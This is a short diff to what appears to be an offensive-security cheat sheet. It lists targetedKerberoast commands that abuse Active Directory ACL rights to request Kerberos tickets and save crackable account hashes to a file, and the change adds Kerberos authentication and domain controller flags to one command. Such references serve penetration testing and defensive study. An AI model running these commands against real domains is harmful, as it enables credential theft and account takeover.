@@ -1,4 +1,4 @@
 # targetedKerberoast — Kerberoast via ACL abuse
 targetedKerberoast -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP
 targetedKerberoast -u $USER -p $PASSWORD -d $DOMAIN --dc-ip $DC_IP -o kerberoast_hashes.txt
-targetedKerberoast -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -o Kerberoastables.txt
+targetedKerberoast -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -k --dc-ip "$DC_IP" --dc-host "$DC_HOST" -o Kerberoastables.txt
